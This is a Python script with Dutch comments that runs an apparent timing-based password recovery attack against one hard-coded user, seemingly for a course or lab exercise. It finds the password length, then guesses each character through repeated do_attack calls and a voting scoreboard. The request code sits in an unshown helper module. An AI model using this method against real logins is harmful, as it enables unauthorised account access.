from string import ascii_lowercase, digits
from helper3 import get_password_length
from random import shuffle
from helper3 import do_attack , pivot_result_list, clean_list, get_high_char
from random import choice
from collections import Counter

class MyCounter(Counter):
    """
    Extra klasse om het scoreboard beter bij te houden. Door het aanpassen van de __str__ is de weergave bij het printen eenvoudiger.
    Hierdoor blijven de tekens langer op 1 regel. Verder blijft dit een standaard Counter uit de python collections
    """
    def __str__(self):
        return "".join('|{}:{}|'.format(k, v) for k, v in self.items())

### Definitions
# sample geeft het aantal te nemen steekproeven weer. Voor het testen handis als deze laag is. 
sample=10
# declaratie van de gebruiker
user='479358'
#user='000000'
# declaratie van debug, binnendoorpaadje handig voor het testen
debug=False
# vastgezette waarde om te winnen
win_condition=7/10
# Harry always wins. Winnaar is diegene met het significante verschil
snitch=10


### get password length

password_lenght=get_password_length(samplesize=sample,debug=debug,user=user)
print(f"De gevonden lengte is {password_lenght}       ")

### get password by cases
## Maak een lijst van cases. Sla deze op in een variable die we niet aanpassen
orig_case_list=(list((ascii_lowercase+digits)*sample))
## Randomisseer de cases om variaties te elenimeren
shuffle(orig_case_list)
## Maak een wachtwoord op basis van een lekker onbekend gegeven. Maakt lekker niet uit. 
sub_pass_list=[choice(orig_case_list) for x in range(0,password_lenght)]

## Laten we beginnen
# Voor iedere positie in de lengte van het wachtwoord. Van 0 tot lengte zodat we index lekker als string[index]  kunnen gebruiken
for index in range(0,password_lenght):
    ## zet de variabelen die we steeds gebruiken op 0
    score_board=[]
    counter=0
    case_list=orig_case_list  #zijweggetje om bij hoge variabiliteit het aantal cases te kunnen verminderen. Leverde weinig op
    endgame=False              #zou het helpen om een 'barrage' te doen als het allemaal wat  moeilijk is?
    #Het spel van het teken gaat beginnen. We blijven zoeken totdat we een winnaar hebben. 
    while True:
        counter+=1
        print(f"Aanval op teken {index+1} met {sub_pass_list}. Het scoreboard is {MyCounter(score_board)}    ")
        result=do_attack(index=index,sub_pass_list=sub_pass_list,user=user,case_list=case_list)
        result=pivot_result_list(result_lijst=result,charlist=set(case_list))
        ## pak de meest aannemelijke waardes
        result=clean_list(result_lijst=result)
        ## pak de meest waarschijnlijke char
        best_result_character=get_high_char(l=result)[0]
        score_board+=best_result_character
        # De winnaar kan bepaald worden vanaf 10 rondes
        if len(score_board)>10:
            if len(MyCounter(score_board).most_common(2))>1:
                winner, runner = MyCounter(score_board).most_common(2)
            else:
                # in het geval van een super stabiele verbinding is er slechts 1 teken op het bord. Snelle hack voor het oplossen van een breaking error. 
                winner = MyCounter(score_board).most_common(2)[0]
                runner = winner
            print(f"Op het bord zijn {winner} en {runner} de belangrijkste spelers")
            if (winner[1]/len(score_board))>win_condition:
                ## we have got a winner
                print(f"winnaar is {winner} omdat hij meer dan de wincondition heeft")
                break #while true
            elif winner[1]-snitch>=runner[1]:
                print(f"winnaar is {winner} omdat hij de snitch heeft")
                break #while true
            ## helpt het om de lijst te verkorten? Als je na 100 pogingen nog niet het bord hebt bereikt dan kan de caselist verkort worden
            # met een slechte netwerkkaart staat het goede tekens regelmatig na 100 rondes nog niet op het bord :-( 
            if (len(score_board)>100) and not endgame:
                shortlist=[]
                endgame=True
                print("nek een nek race klaar maken")
                for item in MyCounter(score_board).most_common(10):
                    shortlist+=item[0]*sample
                shuffle(shortlist)
                case_list=shortlist



    sub_pass_list[index]=winner[0]

print("")
print(sub_pass_list)




